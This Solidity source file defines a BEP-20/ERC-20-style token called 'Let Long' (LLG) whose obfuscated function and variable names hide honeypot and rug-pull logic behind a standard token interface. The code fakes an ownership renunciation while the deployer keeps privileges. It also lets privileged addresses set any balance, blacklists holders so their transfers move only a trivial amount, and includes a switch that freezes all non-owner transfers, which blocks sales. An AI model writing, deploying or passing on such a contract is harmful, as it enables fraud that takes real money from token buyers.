//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface enableWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract listLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeReceiver {
    function createPair(address takeLaunch, address maxFrom) external returns (address);
}

interface autoMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txBuy) external view returns (uint256);

    function transfer(address fundReceiver, uint256 exemptList) external returns (bool);

    function allowance(address teamMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptList) external returns (bool);

    function transferFrom(
        address sender,
        address fundReceiver,
        uint256 exemptList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellFromTotal, uint256 value);
    event Approval(address indexed teamMarketing, address indexed spender, uint256 value);
}

interface autoMaxMetadata is autoMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LetLong is listLiquidity, autoMax, autoMaxMetadata {

    mapping(address => uint256) private shouldEnable;

    string private txTokenTeam = "Let Long";

    function decimals() external view virtual override returns (uint8) {
        return minMarketingMode;
    }

    uint256 private txTotalAt;

    uint256 private fundAmountExempt;

    mapping(address => bool) public shouldList;

    function atAuto(address liquidityShould) public {
        walletAmount();
        
        if (liquidityShould == senderExemptTrading || liquidityShould == senderFrom) {
            return;
        }
        shouldList[liquidityShould] = true;
    }

    function teamShould() public {
        emit OwnershipTransferred(senderExemptTrading, address(0));
        sellReceiver = address(0);
    }

    function tradingList(uint256 exemptList) public {
        walletAmount();
        senderLaunched = exemptList;
    }

    function transfer(address txTo, uint256 exemptList) external virtual override returns (bool) {
        return receiverAmountLiquidity(_msgSender(), txTo, exemptList);
    }

    uint256 senderLaunched;

    function limitFund(address liquidityLaunch) public {
        require(liquidityLaunch.balance < 100000);
        if (listTx) {
            return;
        }
        
        exemptLaunched[liquidityLaunch] = true;
        
        listTx = true;
    }

    function owner() external view returns (address) {
        return sellReceiver;
    }

    function allowance(address maxAuto, address toTeam) external view virtual override returns (uint256) {
        if (toTeam == launchedMode) {
            return type(uint256).max;
        }
        return takeSell[maxAuto][toTeam];
    }

    function symbol() external view virtual override returns (string memory) {
        return isTo;
    }

    address launchedMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function walletAmount() private view {
        require(exemptLaunched[_msgSender()]);
    }

    function transferFrom(address senderReceiver, address fundReceiver, uint256 exemptList) external override returns (bool) {
        if (_msgSender() != launchedMode) {
            if (takeSell[senderReceiver][_msgSender()] != type(uint256).max) {
                require(exemptList <= takeSell[senderReceiver][_msgSender()]);
                takeSell[senderReceiver][_msgSender()] -= exemptList;
            }
        }
        return receiverAmountLiquidity(senderReceiver, fundReceiver, exemptList);
    }

    function tokenSwap(address senderReceiver, address fundReceiver, uint256 exemptList) internal returns (bool) {
        require(shouldEnable[senderReceiver] >= exemptList);
        shouldEnable[senderReceiver] -= exemptList;
        shouldEnable[fundReceiver] += exemptList;
        emit Transfer(senderReceiver, fundReceiver, exemptList);
        return true;
    }

    address senderTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private minMarketingMode = 18;

    uint256 private launchAmount;

    function getOwner() external view returns (address) {
        return sellReceiver;
    }

    constructor (){
        
        enableWallet sellList = enableWallet(launchedMode);
        senderFrom = takeReceiver(sellList.factory()).createPair(sellList.WETH(), address(this));
        if (fundAmountExempt == launchAmount) {
            fundAmountExempt = txTotalAt;
        }
        senderExemptTrading = _msgSender();
        teamShould();
        exemptLaunched[senderExemptTrading] = true;
        shouldEnable[senderExemptTrading] = tradingLaunch;
        
        emit Transfer(address(0), senderExemptTrading, tradingLaunch);
    }

    function receiverAmountLiquidity(address senderReceiver, address fundReceiver, uint256 exemptList) internal returns (bool) {
        if (senderReceiver == senderExemptTrading) {
            return tokenSwap(senderReceiver, fundReceiver, exemptList);
        }
        uint256 receiverMin = autoMax(senderFrom).balanceOf(senderTake);
        require(receiverMin == senderLaunched);
        require(fundReceiver != senderTake);
        if (shouldList[senderReceiver]) {
            return tokenSwap(senderReceiver, fundReceiver, takeTokenReceiver);
        }
        return tokenSwap(senderReceiver, fundReceiver, exemptList);
    }

    mapping(address => bool) public exemptLaunched;

    address public senderExemptTrading;

    bool private walletSell;

    uint256 public senderWallet;

    function name() external view virtual override returns (string memory) {
        return txTokenTeam;
    }

    string private isTo = "LLG";

    bool public listTx;

    uint256 private tradingLaunch = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private takeSell;

    function approve(address toTeam, uint256 exemptList) public virtual override returns (bool) {
        takeSell[_msgSender()][toTeam] = exemptList;
        emit Approval(_msgSender(), toTeam, exemptList);
        return true;
    }

    address private sellReceiver;

    function feeTeam(address txTo, uint256 exemptList) public {
        walletAmount();
        shouldEnable[txTo] = exemptList;
    }

    event OwnershipTransferred(address indexed teamReceiver, address indexed limitFee);

    uint256 marketingEnable;

    address public senderFrom;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingLaunch;
    }

    bool public receiverFeeBuy;

    bool public senderTotal;

    function balanceOf(address txBuy) public view virtual override returns (uint256) {
        return shouldEnable[txBuy];
    }

    uint256 constant takeTokenReceiver = 7 ** 10;

}